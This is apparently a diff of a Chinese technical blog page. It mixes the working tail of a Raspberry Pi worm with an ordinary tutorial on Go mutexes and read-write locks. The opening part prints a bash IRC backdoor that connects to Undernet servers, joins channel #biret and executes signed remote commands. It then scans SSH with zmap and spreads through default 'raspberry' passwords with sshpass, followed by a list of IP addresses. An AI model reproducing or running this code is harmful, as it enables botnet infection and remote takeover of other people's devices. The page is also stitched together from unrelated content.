class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOFMARKER</span></span><br><span class="line"></span><br><span class="line">BOT=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">cat &gt; /tmp/<span class="variable">$BOT</span> &lt;&lt;<span class="string">&#x27;EOFMARKER&#x27;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">SYS=`uname -a | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">NICK=a<span class="variable">$&#123;SYS:24&#125;</span></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">	arr[0]=<span class="string">&quot;ix1.undernet.org&quot;</span></span><br><span class="line">	arr[1]=<span class="string">&quot;ix2.undernet.org&quot;</span></span><br><span class="line">	arr[2]=<span class="string">&quot;Ashburn.Va.Us.UnderNet.org&quot;</span></span><br><span class="line">	arr[3]=<span class="string">&quot;Bucharest.RO.EU.Undernet.Org&quot;</span></span><br><span class="line">	arr[4]=<span class="string">&quot;Budapest.HU.EU.UnderNet.org&quot;</span></span><br><span class="line">	arr[5]=<span class="string">&quot;Chicago.IL.US.Undernet.org&quot;</span></span><br><span class="line">	rand=$[<span class="variable">$RANDOM</span> % 6]</span><br><span class="line">	svr=<span class="variable">$&#123;arr[$rand]&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;exec 3&lt;&gt;/dev/tcp/$svr/6667;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$NICK</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;NICK $NICK\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;USER user 8 * :IRC hi\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">continue</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Main loop</span></span><br><span class="line">	<span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">		<span class="built_in">eval</span> <span class="string">&quot;read msg_in &lt;&amp;3;&quot;</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>  [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PING&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">printf</span> <span class="string">&quot;PONG %s\n&quot;</span> <span class="string">&quot;<span class="variable">$&#123;msg_in:5&#125;</span>&quot;</span>;</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PONG %s\r\n&quot; &quot;$&#123;msg_in:5&#125;&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">			sleep 1</span><br><span class="line">			<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;JOIN #biret\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">			<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">				<span class="built_in">break</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$msg_in</span>&quot;</span> =~ <span class="string">&quot;PRIVMSG&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">			privmsg_h=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 3)</span><br><span class="line">			privmsg_data=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 4)</span><br><span class="line">			privmsg_nick=$(<span class="built_in">echo</span> <span class="variable">$msg_in</span>| cut -d<span class="string">&#x27;:&#x27;</span> -f 2 | cut -d<span class="string">&#x27;!&#x27;</span> -f 1)</span><br><span class="line"></span><br><span class="line">			<span class="built_in">hash</span>=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i | md5sum | awk -F<span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">			sign=`<span class="built_in">echo</span> <span class="variable">$privmsg_h</span> | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$sign</span>&quot;</span> == <span class="string">&quot;<span class="variable">$hash</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">				CMD=`<span class="built_in">echo</span> <span class="variable">$privmsg_data</span> | base64 -d -i`</span><br><span class="line">				RES=`bash -c <span class="string">&quot;<span class="variable">$CMD</span>&quot;</span> | base64 -w 0`</span><br><span class="line">				<span class="built_in">eval</span> <span class="string">&#x27;printf &quot;PRIVMSG $privmsg_nick :$RES\r\n&quot; &gt;&amp;3;&#x27;</span></span><br><span class="line">				<span class="keyword">if</span> [[ ! <span class="string">&quot;$?&quot;</span> -eq 0 ]] ; <span class="keyword">then</span></span><br><span class="line">					<span class="built_in">break</span></span><br><span class="line">				<span class="keyword">fi</span></span><br><span class="line">			<span class="keyword">fi</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOFMARKER</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/<span class="variable">$BOT</span></span><br><span class="line">nohup /tmp/<span class="variable">$BOT</span> 2&gt;&amp;1 &gt; /tmp/bot.log &amp;</span><br><span class="line">rm /tmp/nohup.log -rf</span><br><span class="line">rm -rf nohup.out</span><br><span class="line">sleep 3</span><br><span class="line">rm -rf /tmp/<span class="variable">$BOT</span></span><br><span class="line"></span><br><span class="line">NAME=`mktemp -u <span class="string">&#x27;XXXXXXXX&#x27;</span>`</span><br><span class="line"></span><br><span class="line">date &gt; /tmp/.s</span><br><span class="line"></span><br><span class="line">apt-get update -y --force-yes</span><br><span class="line">apt-get install zmap sshpass -y --force-yes</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ <span class="literal">true</span> ]; <span class="keyword">do</span></span><br><span class="line">	FILE=`mktemp`</span><br><span class="line">	zmap -p 22 -o <span class="variable">$FILE</span> -n 100000</span><br><span class="line">	killall ssh scp</span><br><span class="line">	<span class="keyword">for</span> IP <span class="keyword">in</span> `cat <span class="variable">$FILE</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberry ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="variable">$MYSELF</span> pi@<span class="variable">$IP</span>:/tmp/<span class="variable">$NAME</span>  &amp;&amp; <span class="built_in">echo</span> <span class="variable">$IP</span> &gt;&gt; /opt/.r &amp;&amp; sshpass -praspberryraspberry993311 ssh pi@<span class="variable">$IP</span> -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no <span class="string">&quot;cd /tmp &amp;&amp; chmod +x <span class="variable">$NAME</span> &amp;&amp; bash -c ./<span class="variable">$NAME</span>&quot;</span> &amp;</span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	rm -rf <span class="variable">$FILE</span></span><br><span class="line">	sleep 10</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>ip<br>18.132.196.152<br>102.37.42.55<br>46.30.234.60<br>46.30.234.60<br>79.98.159.7<br>79.98.159.7<br>54.153.54.230<br>81.151.94.19<br>138.68.91.250<br>138.68.91.250<br>35.200.133.234<br>35.200.133.234<br>68.169.61.66<br>77.240.100.215<br>77.240.100.215<br>54.92.204.47<br>206.189.139.95<br>206.189.139.95<br>54.233.114.207<br>198.199.120.102<br>198.199.120.102<br>81.196.205.195<br>81.196.205.195<br>13.52.183.6<br>68.183.228.248<br>68.183.228.248<br>81.196.205.210<br>81.196.205.210<br>134.209.89.233<br>134.209.89.233<br>153.196.173.38<br>153.196.173.38<br>167.172.119.82</p>
 
       
@@ -670,26 +1119,38 @@ var _hmt = _hmt || [];
       
         <h1 id="锁的介绍"><a href="#锁的介绍" class="headerlink" title="锁的介绍"></a>锁的介绍</h1><h2 id="1-互斥锁"><a href="#1-互斥锁" class="headerlink" title="1 互斥锁"></a>1 互斥锁</h2><p>传统并发程序对共享资源进行访问控制的主要手段，由标准库代码包中 sync 中的 Mutex 结构体表示。</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mutex  是互斥锁， 零值是解锁的互斥锁， 首次使用后不得赋值互斥锁。</span></span><br><span class="line"><span class="keyword">type</span> Mutex <span class="keyword">struct</span> &#123;</span><br><span class="line">   state <span class="keyword">int32</span></span><br><span class="line">   sema  <span class="keyword">uint32</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h3 id="sync-Mutex-类型只有两个公开的指针方法"><a href="#sync-Mutex-类型只有两个公开的指针方法" class="headerlink" title="sync.Mutex 类型只有两个公开的指针方法"></a>sync.Mutex 类型只有两个公开的指针方法</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Locker表示可以锁定和解锁的对象。</span></span><br><span class="line"><span class="keyword">type</span> Locker <span class="keyword">interface</span> &#123;</span><br><span class="line">   Lock()</span><br><span class="line">   Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//锁定当前的互斥量</span></span><br><span class="line"><span class="comment">//如果锁已被使用，则调用goroutine</span></span><br><span class="line"><span class="comment">//阻塞直到互斥锁可用。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Mutex)</span> <span class="title">Lock</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对当前互斥量进行解锁</span></span><br><span class="line"><span class="comment">//如果在进入解锁时未锁定m，则为运行时错误。</span></span><br><span class="line"><span class="comment">//锁定的互斥锁与特定的goroutine无关。</span></span><br><span class="line"><span class="comment">//允许一个goroutine锁定Mutex然后安排另一个goroutine来解锁它。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Mutex)</span> <span class="title">Unlock</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+
 <h3 id="声明一个互斥锁："><a href="#声明一个互斥锁：" class="headerlink" title="声明一个互斥锁："></a>声明一个互斥锁：</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br></pre></td></tr></table></figure>
+
 <p>不像 C 或 Java 的锁类工具，我们可能会犯一个错误：忘记及时解开已被锁住的锁，从而导致流程异常。但 Go 由于存在 defer，所以此类问题出现的概率极低。关于 defer 解锁的方式如下：</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Write</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   <span class="keyword">defer</span> mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>如果对一个已经上锁的对象再次上锁，那么就会导致该锁定操作被阻塞，直到该互斥锁回到被解锁状态</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   <span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line">   fmt.Println(<span class="string">&quot;start lock main&quot;</span>)</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get locked main&quot;</span>)</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">1</span>;i&lt;=<span class="number">3</span> ;i++  &#123;</span><br><span class="line">      <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;start lock &quot;</span>,i)</span><br><span class="line">         mutex.Lock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;get locked &quot;</span>,i)</span><br><span class="line">      &#125;(i)</span><br><span class="line">   &#125;</span><br><span class="line">   time.Sleep(time.Second)</span><br><span class="line">   fmt.Println(<span class="string">&quot;Unlock the lock main&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get unlocked main&quot;</span>)</span><br><span class="line">   time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>上面的示例中，我们在 for 循环之前开始加锁，然后在每一次循环中创建一个协程，并对其加锁，但是由于之前已经加锁了，所以这个 for 循环中的加锁会陷入阻塞直到 main 中的锁被解锁， time.Sleep(time.Second) 是为了能让系统有足够的时间运行 for 循环，输出结果如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">start lock main</span><br><span class="line">get locked main</span><br><span class="line">start lock  3</span><br><span class="line">start lock  1</span><br><span class="line">start lock  2</span><br><span class="line">Unlock the lock main</span><br><span class="line">get unlocked main</span><br><span class="line">get locked  3</span><br></pre></td></tr></table></figure>
+
 <p>最终在 main 解锁后，三个协程会重新抢夺互斥锁权，最终协程 3 获胜。<br>互斥锁锁定操作的逆操作并不会导致协程阻塞，但是有可能导致引发一个无法恢复的运行时的 panic，比如对一个未锁定的互斥锁进行解锁时就会发生 panic。避免这种情况的最有效方式就是使用 defer。<br>我们知道如果遇到 panic，可以使用 recover 方法进行恢复，但是如果对重复解锁互斥锁引发的 panic 却是徒劳的（Go 1.8 及以后）。</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">   <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;Try to recover the panic&quot;</span>)</span><br><span class="line">      <span class="keyword">if</span> p := <span class="built_in">recover</span>();p!=<span class="literal">nil</span>&#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;recover the panic : &quot;</span>,p)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;()</span><br><span class="line">   <span class="keyword">var</span> mutex sync.Mutex</span><br><span class="line">   fmt.Println(<span class="string">&quot;start lock&quot;</span>)</span><br><span class="line">   mutex.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;get locked&quot;</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;unlock lock&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;lock is unlocked&quot;</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;unlock lock again&quot;</span>)</span><br><span class="line">   mutex.Unlock()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>以上代码试图对重复解锁引发的 panic 进行 recover，但是我们发现操作失败，输出结果：</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">start lock</span><br><span class="line">get locked</span><br><span class="line">unlock lock</span><br><span class="line">lock is unlocked</span><br><span class="line">unlock lock again</span><br><span class="line">fatal error: sync: unlock of unlocked mutex</span><br><span class="line"></span><br><span class="line">goroutine <span class="number">1</span> [running]:</span><br><span class="line">runtime.throw(<span class="number">0x4c17d4</span>, <span class="number">0x1e</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/<span class="built_in">panic</span>.<span class="keyword">go</span>:<span class="number">1116</span> +<span class="number">0x72</span> fp=<span class="number">0xc000054e88</span> sp=<span class="number">0xc000054e58</span> pc=<span class="number">0x432072</span></span><br><span class="line">sync.throw(<span class="number">0x4c17d4</span>, <span class="number">0x1e</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/<span class="built_in">panic</span>.<span class="keyword">go</span>:<span class="number">1102</span> +<span class="number">0x35</span> fp=<span class="number">0xc000054ea8</span> sp=<span class="number">0xc000054e88</span> pc=<span class="number">0x45f075</span></span><br><span class="line">sync.(*Mutex).unlockSlow(<span class="number">0xc000018018</span>, <span class="number">0xc0ffffffff</span>)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/sync/mutex.<span class="keyword">go</span>:<span class="number">196</span> +<span class="number">0xd8</span> fp=<span class="number">0xc000054ed0</span> sp=<span class="number">0xc000054ea8</span> pc=<span class="number">0x471838</span></span><br><span class="line">sync.(*Mutex).Unlock(...)</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/sync/mutex.<span class="keyword">go</span>:<span class="number">190</span></span><br><span class="line">main.main()</span><br><span class="line">	/tmp/sandbox908680473/prog.<span class="keyword">go</span>:<span class="number">23</span> +<span class="number">0x2b9</span> fp=<span class="number">0xc000054f88</span> sp=<span class="number">0xc000054ed0</span> pc=<span class="number">0x499039</span></span><br><span class="line">runtime.main()</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/proc.<span class="keyword">go</span>:<span class="number">204</span> +<span class="number">0x209</span> fp=<span class="number">0xc000054fe0</span> sp=<span class="number">0xc000054f88</span> pc=<span class="number">0x434889</span></span><br><span class="line">runtime.goexit()</span><br><span class="line">	/usr/local/<span class="keyword">go</span>-faketime/src/runtime/asm_amd64.s:<span class="number">1374</span> +<span class="number">0x1</span> fp=<span class="number">0xc000054fe8</span> sp=<span class="number">0xc000054fe0</span> pc=<span class="number">0x462fa1</span></span><br></pre></td></tr></table></figure>
+
 <p>虽然互斥锁可以被多个协程共享，但还是建议将对同一个互斥锁的加锁解锁操作放在同一个层次的代码中。<br><strong>2 读写锁</strong><br>读写锁是针对读写操作的互斥锁，可以分别针对读操作与写操作进行锁定和解锁操作 。<br>读写锁的访问控制规则如下：<br>① 多个写操作之间是互斥的<br>② 写操作与读操作之间也是互斥的<br>③ 多个读操作之间不是互斥的<br>在这样的控制规则下，读写锁可以大大降低性能损耗。<br>由标准库代码包中 sync 中的 RWMutex 结构体表示</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RWMutex是一个读/写互斥锁，可以由任意数量的读操作或单个写操作持有。</span></span><br><span class="line"><span class="comment">// RWMutex的零值是未锁定的互斥锁。</span></span><br><span class="line"><span class="comment">//首次使用后，不得复制RWMutex。</span></span><br><span class="line"><span class="comment">//如果goroutine持有RWMutex进行读取而另一个goroutine可能会调用Lock，那么在释放初始读锁之前，goroutine不应该期望能够获取读锁定。</span></span><br><span class="line"><span class="comment">//特别是，这种禁止递归读锁定。 这是为了确保锁最终变得可用; 阻止的锁定会阻止新读操作获取锁定。</span></span><br><span class="line"><span class="keyword">type</span> RWMutex <span class="keyword">struct</span> &#123;</span><br><span class="line">   w           Mutex  <span class="comment">//如果有待处理的写操作就持有</span></span><br><span class="line">   writerSem   <span class="keyword">uint32</span> <span class="comment">// 写操作等待读操作完成的信号量</span></span><br><span class="line">   readerSem   <span class="keyword">uint32</span> <span class="comment">//读操作等待写操作完成的信号量</span></span><br><span class="line">   readerCount <span class="keyword">int32</span>  <span class="comment">// 待处理的读操作数量</span></span><br><span class="line">   readerWait  <span class="keyword">int32</span>  <span class="comment">// number of departing readers</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>sync 中的 RWMutex 有以下几种方法：</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对读操作的锁定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RLock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对读操作的解锁</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RUnlock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对写操作的锁定</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">Lock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//对写操作的解锁</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">Unlock</span><span class="params">()</span></span></span><br><span class="line"><span class="comment">//返回一个实现了sync.Locker接口类型的值，实际上是回调rw.RLock and rw.RUnlock.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span> <span class="title">RLocker</span><span class="params">()</span> <span class="title">Locker</span></span></span><br></pre></td></tr></table></figure>
+
 <p>Unlock 会试图唤醒所有因欲进行读锁定而被阻塞的协程，而 RUnlock 只会在已无任何读锁定的情况下，试图唤醒一个因欲进行写锁定而被阻塞的协程。若对一个未被写锁定的读写锁进行写解锁，就会引发一个不可恢复的 panic，同理对一个未被读锁定的读写锁进行读写锁也会如此。<br>由于读写锁控制下的多个读操作之间不是互斥的，因此对于读解锁更容易被忽视。对于同一个读写锁，添加多少个读锁定，就必要有等量的读解锁，这样才能其他协程有机会进行操作。</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> rwm sync.RWMutex</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">      <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">         fmt.Println(<span class="string">&quot;try to lock read &quot;</span>, i)</span><br><span class="line">         rwm.RLock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;get locked &quot;</span>, i)</span><br><span class="line">         time.Sleep(time.Second *<span class="number">2</span>)</span><br><span class="line">         fmt.Println(<span class="string">&quot;try to unlock for reading &quot;</span>, i)</span><br><span class="line">         rwm.RUnlock()</span><br><span class="line">         fmt.Println(<span class="string">&quot;unlocked for reading &quot;</span>, i)</span><br><span class="line">      &#125;(i)</span><br><span class="line">   &#125;</span><br><span class="line">   time.Sleep(time.Millisecond * <span class="number">1000</span>)</span><br><span class="line">   fmt.Println(<span class="string">&quot;try to lock for writing&quot;</span>)</span><br><span class="line">   rwm.Lock()</span><br><span class="line">   fmt.Println(<span class="string">&quot;locked for writing&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>上面的示例创建了三个协程用于对读写锁的读锁定与读解锁操作。在 rwm.Lock()种会对 main 中协程进行写锁定，但是 for 循环中的读解锁尚未完成，因此会造成 mian 中的协程阻塞。当 for 循环中的读解锁操作都完成后就会试图唤醒 main 中阻塞的协程，main 中的写锁定才会完成。输出结果如下</p>
 <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">try to lock read  <span class="number">0</span></span><br><span class="line">get locked  <span class="number">0</span></span><br><span class="line">try to lock read  <span class="number">2</span></span><br><span class="line">get locked  <span class="number">2</span></span><br><span class="line">try to lock read  <span class="number">1</span></span><br><span class="line">get locked  <span class="number">1</span></span><br><span class="line">try to lock <span class="keyword">for</span> writing</span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">0</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">0</span></span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">2</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">2</span></span><br><span class="line">try to unlock <span class="keyword">for</span> reading  <span class="number">1</span></span><br><span class="line">unlocked <span class="keyword">for</span> reading  <span class="number">1</span></span><br><span class="line">locked <span class="keyword">for</span> writing</span><br></pre></td></tr></table></figure>
+
       
 
       
@@ -702,266 +1163,6 @@ var _hmt = _hmt || [];
       
         <p class="article-more-link">
